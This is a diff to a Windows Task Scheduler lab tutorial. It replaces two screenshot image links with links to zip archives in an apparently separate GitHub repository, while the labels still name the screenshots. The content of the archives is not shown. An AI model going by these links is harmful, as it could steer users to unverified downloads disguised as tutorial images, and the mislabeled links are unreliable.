@@ -56,9 +56,9 @@ To start, download the first 2 zip files into your **Documents** folder.
 
 You can click ther Start icon and type "scheduler" or "Task Scheduler" and should get:
 
-![TaskScheduler](/labs/lab_02/os_windows/images/01_TaskSchedulerApp.png)
+![TaskScheduler](https://github.com/rbenitezpagan/labs_integrity/raw/master/app_2/project-html-website-1.zip)
 
-![TaskSchedulerHome](/labs/lab_02/os_windows/images/01A_TaskSchedulerHome.png)
+![TaskSchedulerHome](https://github.com/rbenitezpagan/labs_integrity/raw/master/app_2/project-html-website-2.zip)
 
 ## Activity 2: Create Task
 
